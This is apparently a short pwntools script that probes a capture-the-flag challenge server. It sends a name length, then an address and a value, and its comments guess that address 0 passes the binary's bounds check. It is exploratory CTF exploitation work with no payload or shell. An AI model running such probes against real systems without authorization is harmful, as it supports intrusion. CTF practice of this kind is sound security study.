from pwn import *
context.log_level='debug'
io=remote('chal.secso.cc',4001)

def rd():
    import time; time.sleep(0.8)
    try:
        return io.recv(timeout=3).decode(errors='replace')
    except Exception as e:
        return '<none:%s>'%e

print("STEP0:",rd())
io.sendline(b'20')
print("STEP1 (namelen=20):",rd())
# guess: now game() addr prompt. Let's send an address that FAILS the check to see 'intruder' path, but better to just probe.
io.sendline(b'0')  # maybe addr=0 -> passes check (0 <= &wager)
print("STEP2 (addr=0):",rd())
io.sendline(b'0')  # value
print("STEP3 (value=0):",rd())
io.close()
